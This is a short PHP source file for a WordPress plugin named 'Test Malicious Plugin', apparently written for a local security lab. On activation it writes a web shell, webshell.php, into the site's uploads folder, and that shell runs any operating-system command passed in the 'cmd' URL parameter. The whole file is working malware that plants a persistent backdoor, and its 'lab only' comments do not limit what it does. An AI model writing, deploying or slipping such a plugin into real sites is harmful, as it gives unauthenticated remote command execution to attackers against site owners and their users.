<?php
/*
Plugin Name: Test Malicious Plugin
Description: Simple plugin for local lab (creates webshell in uploads).
Version: 0.1
Author: Lab
*/

// on activation create webshell in uploads
register_activation_hook(__FILE__, 'mp_create_shell');

function mp_create_shell(){
    $upload_dir = wp_upload_dir();
    $file = $upload_dir['basedir'] . '/webshell.php';
    $content = "<?php\n// simple webshell for lab only\nif(isset(\$_GET['cmd'])){ system(\$_GET['cmd']); }\n?>";
    file_put_contents($file, $content);
}

